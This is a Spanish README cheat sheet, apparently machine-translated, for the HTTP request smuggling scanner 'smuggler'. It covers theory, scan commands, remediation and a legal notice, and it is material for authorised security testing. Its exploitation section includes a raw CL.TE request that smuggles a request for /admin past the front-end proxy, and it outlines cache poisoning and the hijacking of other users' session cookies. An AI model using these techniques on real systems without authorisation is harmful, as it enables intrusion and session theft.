<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📦 contrabandista - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```
<p align="centro">
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="contrabandista">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Seguridad web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="centro">
  <b>📦 Herramienta Python modular y ultrarrápida diseñada para detectar y verificar vulnerabilidades de contrabando de solicitudes HTTP (CL.TE, TE.CL y desincronizaciones de mutación de encabezado) en la infraestructura web moderna</b>
</p>

---

## 📋 Tabla de contenidos

- [Resumen y teoría del contrabando HTTP](#-overview--http-smuggling-theory)
  - [Discrepancias CL.TE vs TE.CL](#clte-vs-tecl-discrepancias)
- [Instalación](#-instalación)
- [Escaneo básico de objetivos] (#-escaneo-básico-de-objetivos)
- [Configuraciones de escaneo y motores de mutación] (#-configuraciones-de-escaneo--motores-de-mutación)
  - [Escaneo predeterminado versus exhaustivo] (#escaneo predeterminado versus exhaustivo)
  - [Encabezados personalizados y cookies](#custom-headers--cookies)
- [Escaneo de múltiples objetivos y canalizaciones] (#-multi-objetivo--escaneo de canalizaciones)
- [Análisis de resultados y rutas de explotación](#-análisis-resultados--rutas-de-explotación)
  - [Envenenamiento de caché por contrabando](#envenenamiento-de-cache-por-contrabando)
  - [Evitar los controles de seguridad del front-end](#evitar-los-controles-de-seguridad-del-front-end)
  - [Secuestro de solicitudes de otros usuarios](#secuestro de solicitudes-de-otros-usuarios)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y remediación](#-consideraciones-defensivas--remediación)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y teoría del contrabando HTTP

El contrabando de solicitudes HTTP ocurre cuando un proxy de front-end/equilibrador de carga y un servidor web de back-end no están de acuerdo con los límites de una solicitud HTTP:

### Discrepancias entre CL.TE y TE.CL
- **CL.TE:** El front-end usa `Content-Length`, el back-end usa `Transfer-Encoding: chunked`.
- **TE.CL:** El front-end usa `Transfer-Encoding: chunked`, el back-end usa `Content-Length`.
- **TE.TE:** Ambos admiten `Transfer-Encoding`, pero se puede engañar a uno para que lo ignore mediante la ofuscación del encabezado (por ejemplo, `Transfer-Encoding: xchunked`, pestañas o plegado de líneas).

Creado por **defparam (Evan Ricaurte)**, **smuggler** inyecta cargas útiles cuidadosamente diseñadas para observar retrasos en el tiempo o respuestas de desincronización sin alterar la estabilidad del servicio backend.

---

## 📥 Instalación
```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```
---

## 🚀 Escaneo de objetivos básico

Escanee un único punto final de aplicación web:
```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```
De forma predeterminada, el contrabandista prueba los comportamientos de `CL.TE` y `TE.CL` utilizando cargas útiles de sincronización segura.

---

## ⚙️ Configuraciones de escaneo y motores de mutación

### Análisis predeterminado versus exhaustivo
Smuggler incluye diferentes perfiles de carga útil:
- **Perfil predeterminado:** Mutaciones de desincronización rápidas y comunes.
- **Perfil exhaustivo:** Mutaciones integrales que prueban variaciones de espacios en blanco, encabezados múltiples y encabezados de codificación de transferencia ofuscados:
```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```
### Encabezados y cookies personalizados
Cuando se requiere autenticación o encabezados de host específicos:
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```
---

## 🌐 Escaneo de múltiples objetivos y canalizaciones

Canalice los puntos finales descubiertos desde `httpx` o `subfinder` directamente al contrabandista:
```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```
---

## 💥 Análisis de resultados y rutas de explotación

Cuando el contrabandista informa una coincidencia positiva:
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```
### Envenenamiento de caché por contrabando
Contrabandear una solicitud que genera una redirección fuera del sitio (por ejemplo, manipulación del encabezado del host) para envenenar los cachés web que sirven bibliotecas JavaScript a todos los usuarios.

### Eludir los controles de seguridad frontales
Si el proxy de front-end bloquea `/admin`, contrabandee una solicitud interna secundaria que llegue directamente al back-end sin inspección del proxy:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```
### Secuestro de solicitudes de otros usuarios
Contrabandear un prefijo de una solicitud HTTP. Cuando el siguiente usuario envía su solicitud, se adjunta a su solicitud de contrabando, exponiendo sus cookies y tokens de sesión.

---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Objetivo único rápido** | `python3 smuggler.py -u https://target.com/` |
| **Escaneo profundo exhaustivo**| `python3 smuggler.py -u https://target.com/ -c exhaustive` |
| **Lista de objetivos de escaneo** | `python3 smuggler.py -f targets.txt -t 15` |
| **Encabezados/Cookies personalizados**| `python3 smuggler.py -u <URL> -H "Cookie: sess=123"` |
| **Tiempo de espera personalizado** | `python3 smuggler.py -u <URL> --timeout 15` |

---

## 🛡️ Consideraciones defensivas y remediación

1. **Aplicar HTTP/2 o HTTP/3 de extremo a extremo:** HTTP/2 define longitudes de trama inequívocas, lo que elimina la ambigüedad del encabezado.
2. **Normalizar encabezados HTTP:** Configure servidores proxy inversos para rechazar solicitudes que contengan `Content-Length` y `Transfer-Encoding`.
3. **Eliminar mutaciones ambiguas:** Eliminar solicitudes con encabezados `Transfer-Encoding` ofuscados (por ejemplo, espacios antes de dos puntos, valores múltiples).

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> El contrabando de solicitudes HTTP puede interrumpir las colas de backend activas y envenenar los nodos de caché compartidos. Smuggler debe usarse exclusivamente en objetivos de prueba explícitamente autorizados con permiso estricto de los propietarios de activos.